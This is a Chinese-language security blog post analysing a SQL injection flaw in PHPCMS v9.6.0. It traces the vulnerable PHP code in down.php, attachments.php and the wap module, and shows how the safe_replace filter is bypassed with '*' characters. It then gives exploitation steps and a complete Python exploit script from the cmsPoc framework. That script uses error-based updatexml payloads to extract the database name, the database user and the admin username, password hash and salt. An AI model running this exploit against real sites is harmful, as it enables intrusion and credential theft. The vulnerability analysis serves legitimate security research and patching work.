---
title: "PHPCMS v9.6.0 wap模块sql注入漏洞分析"
date: 2017-08-04 14:19:51
tags: [php,代码审计,sql注入]
categories: Web Security
copyright: true
---
本文首发于:[PHPCMS v9.6.0 wap模块sql注入漏洞分析](https://chybeta.github.io/2017/08/04/%C2%96PHPCMS-v9-6-0-wap%E6%A8%A1%E5%9D%97sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/)
<!-- more -->
# 漏洞分析

在/phpcms/modules/content/down.php中，约莫第11行：
```php
public function init() {
	$a_k = trim($_GET['a_k']);
	if(!isset($a_k)) showmessage(L('illegal_parameters'));
	$a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system','auth_key'));
	if(empty($a_k)) showmessage(L('illegal_parameters'));
	unset($i,$m,$f);
	parse_str($a_k);
	if(isset($i)) $i = $id = intval($i);
	if(!isset($m)) showmessage(L('illegal_parameters'));
	if(!isset($modelid)||!isset($catid)) showmessage(L('illegal_parameters'));
	if(empty($f)) showmessage(L('url_invalid'));
	$allow_visitor = 1;
	$MODEL = getcache('model','commons');
	$tablename = $this->db->table_name = $this->db->db_tablepre.$MODEL[$modelid]['tablename'];
	$this->db->table_name = $tablename.'_data';
	$rs = $this->db->get_one(array('id'=>$id));
```
首先，通过GET方法得到参数`$a_k`。在经过`sys_auth`解密(里面有个DECODE)后，对`$a_k`进行了一次parse_str($a_k)，parse_str()会把字符串解析到对ing的变量中。在经过解析后，通过语句`$rs = $this->db->get_one(array('id'=>$id));`将变量id带入查询。所以目标是寻找一个能加密的地方，并且能够回显给我们，这样就能构造参数$a_k，并造成注入。

在 /phpcms/modules/attachment/attachments.php 中，约莫第239行
```php
public function swfupload_json() {
		$arr['aid'] = intval($_GET['aid']);
		$arr['src'] = safe_replace(trim($_GET['src']));
		$arr['filename'] = urlencode(safe_replace($_GET['filename']));
		$json_str = json_encode($arr);
		$att_arr_exist = param::get_cookie('att_json');
		$att_arr_exist_tmp = explode('||', $att_arr_exist);
		if(is_array($att_arr_exist_tmp) && in_array($json_str, $att_arr_exist_tmp)) {
			return true;
		} else {
			$json_str = $att_arr_exist ? $att_arr_exist.'||'.$json_str : $json_str;
			param::set_cookie('att_json',$json_str);
			return true;			
		}
	}
```

通过GET方法得到参数$arr['src']，先经过`safe_replace()`过滤。我们先看一下`safe_replace()`函数。
```php
function safe_replace($string) {
	$string = str_replace('%20','',$string);
	$string = str_replace('%27','',$string);
	$string = str_replace('%2527','',$string);
	$string = str_replace('*','',$string);
	$string = str_replace('"','&quot;',$string);
	$string = str_replace("'",'',$string);
	$string = str_replace('"','',$string);
	$string = str_replace(';','',$string);
	$string = str_replace('<','&lt;',$string);
	$string = str_replace('>','&gt;',$string);
	$string = str_replace("{",'',$string);
	$string = str_replace('}','',$string);
	$string = str_replace('\\','',$string);
	return $string;
}
```
将`%27`等关键字过滤。但是利用“\*”会被直接过滤为空这点，假设传入的$string为`%2*7`,则在替换后，会变成`%27`，从而获得单引号，其余可类似绕过。

接下来继续运行。若不满足条件，会进入set_cookie()函数，具体如下：
```php
public static function set_cookie($var, $value = '', $time = 0) {
	$time = $time > 0 ? $time : ($value == '' ? SYS_TIME - 3600 : 0);
	$s = $_SERVER['SERVER_PORT'] == '443' ? 1 : 0;
	$var = pc_base::load_config('system','cookie_pre').$var;
	$_COOKIE[$var] = $value;
	if (is_array($value)) {
		foreach($value as $k=>$v) {
			setcookie($var.'['.$k.']', sys_auth($v, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s);
		}
	} else {
		setcookie($var, sys_auth($value, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s);
	}
}
```
其中，会将传入的参数进行一次加密sys_auth($value, 'ENCODE')，这正好满足我们前面的需求。

为了能访问到swfupload_json()，我们需要一个cookie。这样在访问时才不会直接跳转到登陆也main。接下来就是寻找能够给我们提供这次setcookie机会的接口。比如说wap模块。
在 /phpcms/modules/wap/index.php 中，约莫第6行
```php
function __construct() {		
	$this->db = pc_base::load_model('content_model');
	$this->siteid = isset($_GET['siteid']) && (intval($_GET['siteid']) > 0) ? intval(trim($_GET['siteid'])) : (param::get_cookie('siteid') ? param::get_cookie('siteid') : 1);
	param::set_cookie('siteid',$this->siteid);
```
通过GET方法得到$siteid，然后传到了set_cookie()函数中，满足条件。

# 利用
## 利用步骤
+ 访问 /index.php?m=wap&a=index&siteid=1 。获取响应头的set-Cookie字段。
+ 将前一步获取到的字段赋值给userid_flash，作为POST参数。访问 /index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=【payload】
+ 获取返回头的set—Cookie字段，此即为加密后的payload
+ 访问 /index.php?m=content&c=down&a_k=【加密后的payload】，注入成功。

## [cmsPoc](https://github.com/CHYbeta/cmsPoc)
开源CMS渗透测试框架 [cmsPoc](https://github.com/CHYbeta/cmsPoc)中已集成了利用脚本 v960_sqlinject_getpasswd.py。

```python
from lib.core.data import target
import requests,sys,urllib
def poc():
	try:
		url = target.url
		sqli_prefix = '%*27an*d%20'
		sqli_info = 'updatexml(1,concat(1,(user())),1)'
		sqli_password1 = 'updatexml(1,concat(1,(select concat(0x6368796265746124,username,0x3a,password,0x3a,encrypt,0x6368796265746124) from '
		sqli_password2 = '_admin limit 0,1)),1)'
		sqli_padding = '%23%26m%3D1%26f%3Dwobushou%26modelid%3D2%26catid%3D6'

		step1 = url + '/index.php?m=wap&a=index&siteid=1'
		r = requests.get(step1)
		post = {"userid_flash":r.cookies["GPYAh_siteid"]}
		print('[+] Get Cookie : ' + r.cookies["GPYAh_siteid"])

		step2  = url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=" + sqli_prefix + sqli_info+ sqli_padding
		r = requests.post(step2,data=post)
		sqli_payload = r.cookies["GPYAh_att_json"]
		print('[+] Get SQLi Payload : ' + sqli_payload)

		step3 = url + '/index.php?m=content&c=down&a_k=' + sqli_payload
		html = requests.get(step3).text

		db_start = html.find("SELECT * FROM `") + len("SELECT * FROM `")
		db_end = html.find("`.`")
		Database = html[db_start:db_end]
		print("[+] Get Database Name: "+ Database)

		tableprefix_start = html.find("`.`") + len("`.`")
		tableprefix_end = html.find("_download_data")
		tableprefix = html[tableprefix_start:tableprefix_end]
		print("[+] Get Table Prefix: "+ tableprefix)

		startIndex = html.find("XPATH syntax error: '") + len("XPATH syntax error: '")
		endIndex = html.find("' <br /> <b>MySQL Errno")
		database_user = html[startIndex:endIndex]
		print("[+] Get Database-user Information : " + database_user)

		step4  = url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=" + sqli_prefix + sqli_password1+ tableprefix + sqli_password2 + sqli_padding
		r = requests.post(step4,data=post)
		sqli_payload = r.cookies["GPYAh_att_json"]

		setp5 = url + '/index.php?m=content&c=down&a_k=' + sqli_payload
		html = requests.get(setp5).text
		startIndex = html.find("XPATH syntax error: '") + len("XPATH syntax error: '")
		endIndex = html.find("' <br /> <b>MySQL Errno")
		admin_passwd = html[startIndex:endIndex]
		print("[+] Get User Passwd: " + admin_passwd)

		print("\033[33m[*] Complete this task: {} \033[0m".format(target.url))

	except KeyError as e:

		print("\033[31m[!] This poc doesn't seem to work.Please try another one.\033[0m")
```

![](https://github.com/CHYbeta/cmsPoc/blob/master/tty.gif?raw=true)
